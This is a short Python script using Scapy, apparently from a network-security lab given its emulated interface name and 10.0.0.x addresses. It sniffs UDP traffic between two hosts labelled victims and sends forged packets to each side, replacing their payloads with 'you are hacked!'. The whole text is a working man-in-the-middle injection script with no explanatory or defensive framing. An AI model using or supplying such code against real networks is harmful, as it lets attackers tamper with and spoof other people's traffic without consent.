from scapy.all import *

victim_1_ip = "10.0.0.1"  # Host 1 (UDP Client)
victim_2_ip = "10.0.0.2"  # Host 2 (UDP Server)

def intercept_packet(packet):
    if packet.haslayer(UDP) and packet[IP].src == victim_1_ip and packet[IP].dst == victim_2_ip:
        print(f"Intercepted UDP packet from {victim_1_ip} to {victim_2_ip}")
        print(f"Original Payload: {packet[Raw].load}")

        modified_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \
                          UDP(sport=packet[UDP].sport, dport=packet[UDP].dport) / \
                          Raw(load="you are hacked!")

        send(modified_packet, verbose=False)
        print(f"Sent modified packet to {victim_2_ip}: 'you are hacked!'")

    elif packet.haslayer(UDP) and packet[IP].src == victim_2_ip and packet[IP].dst == victim_1_ip:
        print(f"Intercepted UDP packet from {victim_2_ip} to {victim_1_ip}")
        print(f"Original Payload: {packet[Raw].load}")

        modified_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \
                          UDP(sport=packet[UDP].sport, dport=packet[UDP].dport) / \
                          Raw(load="you are hacked!")

        send(modified_packet, verbose=False)
        print(f"Sent modified packet to {victim_1_ip}: 'you are hacked!'")

sniff(iface="h3-eth0", filter="udp", prn=intercept_packet)
